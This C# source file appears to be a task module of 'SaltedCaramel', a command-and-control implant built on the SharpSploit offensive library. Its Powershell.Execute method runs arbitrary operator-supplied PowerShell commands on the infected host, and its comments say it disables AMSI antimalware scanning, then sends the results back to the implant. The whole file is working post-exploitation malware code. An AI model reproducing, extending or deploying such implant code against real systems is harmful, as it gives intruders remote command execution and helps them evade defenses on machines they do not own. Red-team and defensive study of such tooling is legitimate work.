using Newtonsoft.Json;
using SharpSploit.Execution;
using System;
using System.Diagnostics;
using SaltedCaramel.Jobs;

namespace SaltedCaramel.Tasks
{
    public class Powershell
    {
        /// <summary>
        /// Execute arbitrary powershell commands within
        /// a PS Runspace. Various AMSI options are disabled
        /// as well. See: SharpSploit Shell.PowerShellExecute
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="agent">Agent associated with this task.</param>
        public static void Execute(Job job, SCImplant agent)
        {
            SCTask task = job.Task;
            string args = task.@params;

            try
            {
                string result = Shell.PowerShellExecute(args);

                task.status = "complete";
                task.message = JsonConvert.SerializeObject(result);
            }
            catch (Exception e)
            {
                Debug.WriteLine("[!] Powershell - ERROR: " + e.Message);
                task.message = e.Message;
            }
        }
    }
}
